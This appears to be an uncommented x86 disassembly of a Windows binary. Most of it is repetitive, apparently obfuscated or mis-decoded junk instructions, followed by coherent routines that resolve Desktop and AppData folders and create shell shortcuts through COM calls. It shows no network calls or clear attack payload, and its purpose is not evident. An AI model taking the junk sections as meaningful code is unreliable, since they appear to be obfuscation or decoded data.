jmp 0xffffffffe7289dcb
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13cdab
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100c8dc
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_4045e2
jg r-xdata
push ecx
push edi
call sub_404662
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20782
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d7b
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7289dcb
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13cdab
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c15d35
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb920
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100c8dc
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40463e
jae r-xdata
push esp
push edx
call sub_4045b0
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120c879
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcc852
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20782
ja r-xdata
jmp 0xffffffffe7289dcb
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d7b
jno r-xdata
jno 0xffffffffff13cdab
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c15d35
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb920
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100c8dc
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_404719
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_404719
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_404751
jne 0xffffffffa3a52dc4
push esi
push esi
pushfd
call sub_404742
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add bh bl
inc edi
inc eax
add [ ebx + 0x57704ec ] al
jmp 0xffffffff894f4dd9
sub_404751
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f4dd9
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864ec78
mov ecx 0x850fef7f
push ebp
call sub_404775
jns 0xffffffffc2c150df
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_404798
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_404790
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x1050c64
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_4047c9
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x80 ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x80 ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x78 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x78 ] edx
jmp r-xdata
cmp [ ebp - 0x80 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x78 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x7c ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x7c ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x84 ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_40499c
retn 0x10
sub_404790
push ebx
push eax
call sub_404798
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_404790
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x1050c64
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_4047c9
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x80 ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x80 ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x78 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x78 ] edx
jmp r-xdata
cmp [ ebp - 0x80 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x78 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x7c ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x7c ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x84 ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_40499c
retn 0x10
sub_404798
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_404790
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8289af7
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x1050c64
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_4047c9
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x80 ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x80 ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x78 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x78 ] edx
jmp r-xdata
cmp [ ebp - 0x80 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x78 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x7c ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x7c ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x84 ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_40499c
retn 0x10
sub_404911
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe846ba69
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35c06d
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
or ecx 0x30246c81
stc
dec eax
inc eax
add [ ebx + 0x127304ec ] al
push ebp
push esp
sub esp 0x8
call sub_40493d
jae 0x5a7637b7
push ebx
jmp 0xffffffff83949e84
push edx
push ebp
sub esp 0xc
call sub_404962
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
int1
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fec
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864b5c9
add al [ ebx + 0x77d04ec ]
sub_40493d
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x4864b5c9
push edx
push ebp
sub esp 0xc
call sub_404962
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
int1
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fec
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_404962
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc39ea9
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f4fec
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff8400380a
push ebx
call sub_40498a
jge 0xffffffff844f53f6
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_4049b6
jpo 0x59284f2c
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3abf0a
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53919e1b
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
call sub_4049d1
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
int1
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
push edx
push ebp
sub esp 0xc
call sub_404962
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_40499c
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_4049b6
jpo 0x59284f2c
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3abf0a
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53919e1b
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
call sub_4049d1
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_404962
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
int1
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fec
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_4049b6
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53919e1b
pop eax
jae r-xdata
call 0xe3abf0a
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
call sub_4049d1
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push edx
push ebp
sub esp 0xc
call sub_404962
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
int1
dec ecx
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f4fec
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_4049d1
jae r-xdata
pop edx
jns 0x5b003a50
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
jns r-xdata
sub_404a20
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_42901d
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
pop ebp
retn
sub_404a70
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x210 ] eax
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x0
push 0x10
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
lea eax [ ebp - 0x20c ]
je r-xdata
push edi
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
mov ecx ebx
push eax
push [ ebp - 0x210 ]
call sub_404b30
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
push r--data
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x20c ]
sub_404b30
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push esi
call [ CoInitialize@IAT ]
test eax eax
jns r-xdata
lea eax [ ebp - 0x418 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
js r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
call [ CoUninitialize@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x418 ]
push edi
push eax
mov ecx [ eax ]
call [ ecx + 0x50 ]
push 0x104
push edi
mov edi [ lstrcpynW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call edi
lea eax [ ebp - 0x20c ]
push 0x5c
push eax
call sub_40e23d
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x418 ]
lea edx [ ebp - 0x20c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x418 ]
lea edx [ ebp - 0x41c ]
push edx
push r--data
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
js r-xdata
xor ecx ecx
mov [ eax ] cx
mov eax [ ebp - 0x41c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ ebp - 0x418 ]
push ecx
mov edx [ ecx ]
call [ edx + 0x8 ]
push 0x104
push ebx
lea eax [ ebp - 0x414 ]
push eax
call edi
push r--data
lea eax [ ebp - 0x414 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x41c ]
lea edx [ ebp - 0x414 ]
push 0x1
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
mov eax [ ebp - 0x41c ]
push eax
mov ecx [ eax ]
js r-xdata
call [ ecx + 0x8 ]
mov eax [ ebp - 0x418 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
call [ ecx + 0x8 ]
mov eax [ ebp - 0x418 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov esi 0x1
jmp r-xdata
sub_404ca0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x210 ] eax
mov edi ecx
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x0
push 0x1a
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrlenW@IAT ]
mov esi [ lstrcatW@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
lea eax [ ebp - 0x20c ]
jne r-xdata
push r--data
push r--data
jmp r-xdata
push eax
call esi
push [ ebp - 0x210 ]
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ ebp - 0x20c ]
mov ecx edi
push eax
push ebx
call sub_404b30
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
